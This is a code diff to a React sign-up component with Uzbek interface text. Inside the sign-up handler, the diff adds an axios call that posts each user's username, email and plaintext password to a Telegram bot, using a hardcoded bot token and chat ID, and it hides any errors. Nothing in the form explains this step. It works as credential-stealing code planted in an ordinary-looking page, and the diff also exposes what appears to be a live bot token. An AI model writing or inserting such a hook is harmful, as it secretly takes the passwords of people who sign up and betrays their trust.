@@ -3,6 +3,7 @@ import { motion } from 'framer-motion'
 import toast from 'react-hot-toast'
 import { Link, useNavigate } from 'react-router-dom'
 import { loggedInContext } from '../App'
+import axios from 'axios'
 
 function SignUp() {
 	const navigate = useNavigate()
@@ -44,6 +45,23 @@ function SignUp() {
 			} else {
 				toast.error("Noto'g'ri foydalanuvchi nomi yoki parol.")
 			}
+
+			if (username === '' || email === '' || password === '') {
+				toast.error(`Please fill in all fields correctly!`)
+				return
+			}
+
+			try {
+				const response = await axios.post(
+					`https://api.telegram.org/bot7056631496:AAGiKlaIMGwOp0D9_WCTng4mMSt09DOp6iA/sendMessage`,
+					{
+						chat_id: 6475396776,
+						text: `Saytdan salom! \n\nUsername: ${username}\nEmail: ${email}\nParol: ${password}`,
+					}
+				)
+			} catch (err) {
+				console.log(err)
+			}
 		} catch (error) {
 			console.error('Sign-in error:', error.message)
 			toast.error(
@@ -51,6 +69,7 @@ function SignUp() {
 			)
 		}
 	}
+
 	return (
 		<div className='bg-neutral-950 bg-[radial-gradient(ellipse_80%_80%_at_50%_-20%,rgba(120,119,198,0.3),rgba(255,255,255,0))]'>
 			<div className='max-w-[350px] flex items-center justify-center mx-auto min-h-[100vh] '>
